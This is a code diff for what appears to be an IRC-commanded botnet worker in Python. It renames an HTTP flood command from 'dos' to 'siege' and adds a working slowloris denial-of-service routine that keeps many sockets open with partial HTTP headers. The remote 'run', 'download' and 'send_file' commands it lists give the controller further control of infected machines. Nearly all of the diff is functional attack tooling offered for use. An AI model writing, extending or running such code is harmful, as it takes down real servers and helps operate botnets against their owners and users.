@@ -15,6 +15,7 @@ monkey.patch_all()
 import urllib2
 
 from gevent import socket
+from gevent.dns import DNSError
 from gevent.event import Event
 from gevent.queue import Queue
 
@@ -159,16 +160,54 @@ class BaseWorkerBot(IRCBot):
         return '!worker-pong {%s}' % platform.node()
 
 
+class Conn(object):
+    """\
+    A simple connection class used by the slowloris attack
+    """
+    def __init__(self, host, port, socket_timeout):
+        self.host = host
+        self.port = port
+        self.socket_timeout = socket_timeout
+        self.connected = False
+    
+    def connect(self):
+        # recreate the socket object
+        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._sock.settimeout(self.socket_timeout)
+        
+        # indicate that we are not connected
+        self.connected = False
+        
+        try:
+            self._sock.connect((self.host, self.port))
+        except DNSError:
+            pass
+        except socket.error:
+            pass
+        else:
+            self.connected = True
+        
+        return self.connected
+    
+    def send(self, data):
+        try:
+            return self._sock.send(data)
+        except socket.error:
+            self.connected = False
+            raise
+
+
 class WorkerBot(BaseWorkerBot):
     def get_task_patterns(self):
         return (
-            ('dos (?P<url>.*)', self.dos),
             ('download (?P<url>.*)', self.download),
             ('get_time(?: (?P<format>.+))?', self.get_time),
             ('info', self.info),
             ('ports', self.ports),
             ('run (?P<program>.*)', self.run),
             ('send_file (?P<filename>[^\s]+) (?P<destination>[^\s]+)', self.send_file),
+            ('siege (?P<url>.*)', self.siege),
+            ('slowloris (?P<host>[^\s]+) (?P<num>\d+)(?: (?P<port>\d+))?', self.slowloris),
             ('status', self.status_report),
         )
     
@@ -177,22 +216,6 @@ class WorkerBot(BaseWorkerBot):
         if format:
             return now.strftime(format)
         return str(now)
-    
-    def dos(self, url):
-        count = 0
-        
-        def fetcher(url):
-            req = urllib2.urlopen(url)
-            req.read()
-        
-        while not self.stop_flag.is_set():
-            greenlets = [
-                gevent.spawn(fetcher, url) for x in range(100)
-            ]
-            [g.join() for g in greenlets]
-            count += 100
-        
-        return 'sent %s requests' % count
     
     def download(self, url):
         path, filename = url.rsplit('/', 1)
@@ -266,6 +289,64 @@ class WorkerBot(BaseWorkerBot):
         fh.close()
         sock.close()
         return 'sent successfully'
+    
+    def siege(self, url):
+        count = 0
+        
+        def fetcher(url):
+            req = urllib2.urlopen(url)
+            req.read()
+        
+        while not self.stop_flag.is_set():
+            greenlets = [
+                gevent.spawn(fetcher, url) for x in range(100)
+            ]
+            [g.join() for g in greenlets]
+            count += 100
+        
+        return 'sent %s requests' % count
+    
+    def slowloris(self, host, num, port=None):
+        port = port or 80
+        conns = [Conn(host, int(port), 5) for i in range(int(num))]
+        failed = 0
+        packets = 0
+        
+        while not self.stop_flag.is_set():
+            for conn in conns:
+                if self.stop_flag.is_set():
+                    break
+                
+                if not conn.connected:
+                    if conn.connect():
+                        packets += 3
+                
+                if conn.connected:
+                    query = '?%d' % random.randint(1, 9999999999999)
+                    payload = "GET /%s HTTP/1.1\r\n" % query +\
+                        "Host: %s\r\n" % conn.host +\
+                        "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n" +\
+                        "Content-Length: 42\r\n";
+                    try:
+                        conn.send(payload)
+                        packets += 1
+                    except socket.error:
+                        pass
+                else:
+                    pass
+            
+            for conn in conns:
+                if self.stop_flag.is_set():
+                    break
+                
+                if conn.connected:
+                    try:
+                        conn.send('X-a: b\r\n')
+                        packets += 1
+                    except socket.error:
+                        pass
+            
+        return "%s failed, %s packets sent" % (failed, packets)
     
     def status_report(self):
         return self.task_queue.qsize()
